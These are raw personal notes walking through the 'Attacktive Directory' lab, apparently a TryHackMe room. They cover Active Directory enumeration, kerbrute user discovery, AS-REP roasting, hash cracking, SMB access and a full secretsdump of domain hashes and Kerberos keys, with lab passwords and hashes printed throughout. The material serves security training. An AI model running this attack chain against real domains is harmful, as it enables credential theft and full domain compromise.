# Attacktive Directory


## script setups

	sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
	sudo pip3 install -r /opt/impacket/requirements.txt
	cd /opt/impacket/ 
	sudo pip3 install .
	sudo python3 setup.py install
	apt install bloodhound neo4j
	apt update && apt upgrade
	wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386
	chmod +x kerbrute_linux_386 
	mv kerbrute_linux_386 kerbrute
	

## enumeration
	enum4linux

enum4linux 10.10.157.51
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan  7 19:22:08 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.157.51
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.157.51    |
 ==================================================== 
[+] Got domain/workgroup name: THM-AD

 ============================================ 
|    Nbtstat Information for 10.10.157.51    |
 ============================================ 
Looking up status of 10.10.157.51
	ATTACKTIVEDIREC <00> -         B <ACTIVE>  Workstation Service
	THM-AD          <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	THM-AD          <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	THM-AD          <1b> -         B <ACTIVE>  Domain Master Browser
	ATTACKTIVEDIREC <20> -         B <ACTIVE>  File Server Service

	MAC Address = 02-42-F7-90-E5-77

 ===================================== 
|    Session Check on 10.10.157.51    |
 ===================================== 
[+] Server 10.10.157.51 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.157.51    |
 =========================================== 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.157.51    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.10.157.51 from smbclient: 
[+] Got OS info for 10.10.157.51 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.157.51    |
 ============================= 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.157.51    |
 ========================================= 
WARNING: The "syslog" option is deprecated
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.157.51]

	Sharename       Type      Comment
	---------       ----      -------
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.157.51 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.157.51

 ==================================================== 
|    Password Policy Information for 10.10.157.51    |
 ==================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================== 
|    Groups on 10.10.157.51    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.157.51 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)

 ============================================= 
|    Getting printer info for 10.10.157.51    |
 ============================================= 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Jan  7 19:22:41 2023

spookysec.local


kerbrute userenum
echo "10.10.114.10    spookysec.local" >> /etc/hosts
/kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
	2023/01/14 01:59:07 >  [+] VALID USERNAME:       james@spookysec.local
	**2023/01/14 01:59:07 >  [+] VALID USERNAME:       svc-admin@spookysec.local**
	2023/01/14 01:59:08 >  [+] VALID USERNAME:       James@spookysec.local
	2023/01/14 01:59:08 >  [+] VALID USERNAME:       robin@spookysec.local
	2023/01/14 01:59:10 >  [+] VALID USERNAME:       darkstar@spookysec.local
	**2023/01/14 01:59:11 >  [+] VALID USERNAME:       administrator@spookysec.local**                                                                            
	**2023/01/14 01:59:13 >  [+] VALID USERNAME:       backup@spookysec.local**
	2023/01/14 01:59:13 >  [+] VALID USERNAME:       paradox@spookysec.local
	2023/01/14 01:59:19 >  [+] VALID USERNAME:       JAMES@spookysec.local
	2023/01/14 01:59:21 >  [+] VALID USERNAME:       Robin@spookysec.local
	2023/01/14 01:59:33 >  [+] VALID USERNAME:       Administrator@spookysec.local                                                                            
	2023/01/14 01:59:56 >  [+] VALID USERNAME:       Darkstar@spookysec.local
	2023/01/14 02:00:04 >  [+] VALID USERNAME:       Paradox@spookysec.local
	2023/01/14 02:00:29 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local

impacket-GetNPUsers spookysec.local/svc-admin -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a1d2a44d73f295764e78cde09937d2d9$68570572c9998547fdaa515767e3c50300b6d45f7e28927cc98fca06a7bb6ec21c74f0ad493221d83d3bef0ede13799c8a371f778ae3f4e6fd73f504d13d89ce6ad2a0e31ba8cc67a3edc9fc7938c9dcfd5726b0699e82c75f5c139d850febd33fb08c2a44dce30cbd71aec04d8daad715079ae2cf6fa2976d69ba1ec1c98415fccfea8185bd21ef75bb24755e07c40daddbbf071acef7fa895371c1f161bc4e578778d0f66d6b47c39edc9ead43bac4b05c7f7e503c7f3a46aedfc5a6b1b9539510bf120d7a16ad86326212446bffd564ff528cd2ee2f0a42f1046bf441a986b0315e75a33456bbce7478e01a3096875296

https://hashcat.net/wiki/doku.php?id=example_hashes

hashcat hash passwordlist.txt 
	management2005

smbclient -L spookysec.local\\10.10.114.10 -U 'svc-admin'
smbmap -H spookysec.local -d spookysec.local -u svc-admin -p management2005

physically map to smb download file in backup
	YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
base64 -d hash2
	backup@spookysec.local:backup2517860



└─$ impacket-secretsdump -just-dc backup@spookysec.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
impacket-secretsdump -just-dc backup@spookysec.local
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0ec2346709361bae4ae5327b66af1ddd:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
